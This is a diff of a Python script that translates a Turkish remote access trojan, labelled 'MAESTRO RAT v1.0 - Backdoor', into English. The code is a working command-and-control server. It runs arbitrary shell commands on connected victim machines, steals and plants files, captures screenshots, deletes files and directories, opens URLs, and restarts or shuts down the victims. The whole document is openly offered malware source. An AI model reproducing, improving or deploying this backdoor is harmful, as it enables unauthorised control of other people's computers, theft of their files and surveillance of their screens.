@@ -3,90 +3,83 @@ import argparse
 import threading
 import os
 
-
 commands = [
-    ("exit", "İstemci bağlantısını sonlandırır."),
-    ("execute", "Belirli bir terminal komutunu istemcide çalıştırır."),
-    ("openfile [dosya_adı]", "Belirtilen dosyanın içeriğini sunucudan istemciye gönderir."),
-    ("deletefile [dosya_adı]", "Belirtilen dosyayı siler."),
-    ("deletedirectory [dizin_adı]", "Belirtilen dizini siler."),
-    ("ls / dir", "İstemcideki mevcut dizinin içeriğini listeler."),
-    ("cd [hedef_klasör]", "İstemcideki çalışma dizinini değiştirir."),
-    ("createdirectory [klasör_adı]", "Yeni bir klasör oluşturur."),
-    ("createfile [dosya_adı]", "Yeni bir dosya oluşturur."),
-    ("editfile [metin] >> [dosya_adı]", "Belirtilen dosyanın sonuna metin ekler."),
-    ("whoami", "İstemcide oturum açmış kullanıcıyı döndürür."),
-    ("ifconfig", "İstemcinin ağ bilgilerini döndürür."),
-    ("cpu", "İstemcinin CPU bilgilerini döndürür."),
-    ("memory", "İstemcinin bellek kullanım bilgilerini döndürür."),
-    ("osinfo", "İstemcinin işletim sistemi bilgilerini döndürür."),
-    ("browser [url]", "Belirtilen URL'yi istemcide açar."),
-    ("upload", "İstemciden sunucuya dosya yükler."),
-    ("download", "İstemciden istemciye dosya indirir."),
-    ("screenshot", "İstemcinin ekran görüntüsünü alır."),
-    ("restart", "İstemciyi yeniden başlatır."),
-    ("poweroff", "İstemciyi kapatır."),
-    ("cd [dizin]", "Dizini değiştirir."),
-    ("clear", "Terminali temizler.")
+    ("exit", "Terminates the client connection."),
+    ("execute", "Executes a specified terminal command on the client."),
+    ("openfile [filename]", "Sends the content of the specified file from the server to the client."),
+    ("deletefile [filename]", "Deletes the specified file."),
+    ("deletedirectory [directory_name]", "Deletes the specified directory."),
+    ("ls / dir", "Lists the contents of the current directory on the client."),
+    ("cd [target_folder]", "Changes the working directory on the client."),
+    ("createdirectory [folder_name]", "Creates a new directory."),
+    ("createfile [filename]", "Creates a new file."),
+    ("editfile [text] >> [filename]", "Appends the specified text to the end of the file."),
+    ("whoami", "Returns the logged-in user on the client."),
+    ("ifconfig", "Returns the network information of the client."),
+    ("cpu", "Returns the CPU information of the client."),
+    ("memory", "Returns the memory usage information of the client."),
+    ("osinfo", "Returns the operating system information of the client."),
+    ("browser [url]", "Opens the specified URL on the client."),
+    ("upload", "Uploads a file from the client to the server."),
+    ("download", "Downloads a file from the client to the client."),
+    ("screenshot", "Takes a screenshot of the client's screen."),
+    ("restart", "Restarts the client."),
+    ("poweroff", "Shuts down the client."),
+    ("cd [directory]", "Changes the directory."),
+    ("clear", "Clears the terminal.")
 ]
 
-print("{:<40} {}".format("Komut", "Açıklama"))
+print("{:<40} {}".format("Command", "Description"))
 print("="*60)
 for command, description in commands:
     print("{:<40} {}".format(command, description))
 
 
 def handle_client(conn, addr):
-    print(f"Bağlantı alındı: {addr}")
+    print(f"Connection received from: {addr}")
 
-    try:        
+    try:
         while True:
             try:
-                komut = input("Komutu giriniz ('exit' yazarak çıkabilirsiniz): ")
-                conn.send(komut.encode())
+                command = input("Enter command ('exit' to quit): ")
+                conn.send(command.encode())
                 
-                if komut == 'exit':
+                if command == 'exit':
                     break
                 
-                elif not komut:
+                elif not command:
                     continue
                     
-                elif komut == 'commandlist' :
-                    print("{:<40} {}".format("Komut", "Açıklama"))
+                elif command == 'commandlist':
+                    print("{:<40} {}".format("Command", "Description"))
                     print("="*60)
                     
-                elif komut == 'clear':
-                    x = os.name 
-                    if x == 'posix':
-                        os.system('clear')
-                    else:
-                        os.system('cls')                        
+                elif command == 'clear':
+                    os.system('clear' if os.name == 'posix' else 'cls')
 
-                elif komut == 'execute':
-                    print("Lütfen 'execute' komutu için bir komut girin:")
-                    islem = input()
-                    conn.send(islem.encode())
+                elif command == 'execute':
+                    print("Please enter a command for 'execute':")
+                    operation = input()
+                    conn.send(operation.encode())
                     received_data = conn.recv(8192)
                     print(received_data.decode(errors='ignore'))
                 
-                                
-                elif komut == 'upload':
-                    islem = input("Upload edilecek dosya ismini giriniz : ")
-                    dosya_adi = islem
-                    conn.send(dosya_adi.encode())
+                elif command == 'upload':
+                    filename = input("Enter the name of the file to upload: ")
+                    conn.send(filename.encode())
                     try:
-                        with open(dosya_adi, 'rb') as file:
+                        with open(filename, 'rb') as file:
                             while (data := file.read(8192)):
                                 conn.send(data)
                             conn.send('UPLOAD_COMPLETE'.encode())
-                            print(f'{dosya_adi} başarılı bir şekilde upload edildi.')
+                            print(f'{filename} has been successfully uploaded.')
                     except FileNotFoundError:
-                        print('HATA: Dosya bulunamadı.')
+                        print('ERROR: File not found.')
                                         
-                elif komut == 'download':
-                    islem = input("İndirilecek Dosya İsmini Giriniz : ")
-                    conn.send(islem.encode())
-                    with open(islem, 'wb') as file:
+                elif command == 'download':
+                    filename = input("Enter the name of the file to download: ")
+                    conn.send(filename.encode())
+                    with open(filename, 'wb') as file:
                         while True:
                             data = conn.recv(8192)
                             if data.endswith('DOWNLOAD_COMPLETE'.encode()):
@@ -94,9 +87,9 @@ def handle_client(conn, addr):
                                 file.write(data)
                                 break
                             file.write(data)
-                        print(f"{islem} dosyası başarılı bir şekilde bulunduğunuz dizine indirildi.[√]")
+                        print(f"{filename} has been successfully downloaded to your directory. [√]")
                                      
-                elif komut == 'screenshot':
+                elif command == 'screenshot':
                     with open('screenshothacked.png', 'wb') as file:
                         while True:
                             file_data = conn.recv(8192)
@@ -105,32 +98,32 @@ def handle_client(conn, addr):
                                 file.write(file_data)
                                 break
                             file.write(file_data)
-                        print("Ekran görüntüsü bulunduğunuz dizine kayıt edildi.")
+                        print("Screenshot has been saved to your directory.")
                     
-                elif komut.startswith('browser'):
-                    link = komut.split(" ", 1)[1]
+                elif command.startswith('browser'):
+                    link = command.split(" ", 1)[1]
                     conn.send(link.encode())
-                    sonuc = conn.recv(8192).decode()
-                    print(sonuc)
+                    result = conn.recv(8192).decode()
+                    print(result)
                 
                 else:
                     received_data = conn.recv(8192)
                     print(received_data.decode(errors='ignore'))
                     
             except Exception as e:
-                print(f"Hata: {str(e)}")
+                print(f"Error: {str(e)}")
                 break
 
     except Exception as e:
-        print(f"Bağlantı hatası: {str(e)}")
+        print(f"Connection error: {str(e)}")
 
     finally:
         conn.close()
 
 def main():
-    parser = argparse.ArgumentParser(description='MAESTRO RAT v1.0 - Arka Kapı')
-    parser.add_argument('-lhost', dest='ip', help='Hedef IP adresi', required=True)
-    parser.add_argument('-lport', dest='port', help='Hedef port numarası', required=True)
+    parser = argparse.ArgumentParser(description='MAESTRO RAT v1.0 - Backdoor')
+    parser.add_argument('-lhost', dest='ip', help='Target IP address', required=True)
+    parser.add_argument('-lport', dest='port', help='Target port number', required=True)
     args = parser.parse_args()
 
     ip = args.ip
@@ -139,7 +132,7 @@ def main():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((ip, port))
         s.listen(5)
-        print(f"{ip}:{port} dinleniyor...")
+        print(f"Listening on {ip}:{port}...")
 
         while True:
             try:
@@ -147,7 +140,7 @@ def main():
                 client_thread = threading.Thread(target=handle_client, args=(conn, addr))
                 client_thread.start()
             except Exception as e:
-                print(f"Bağlantı kabul hatası: {str(e)}")
+                print(f"Connection acceptance error: {str(e)}")
 
 if __name__ == "__main__":
     main()
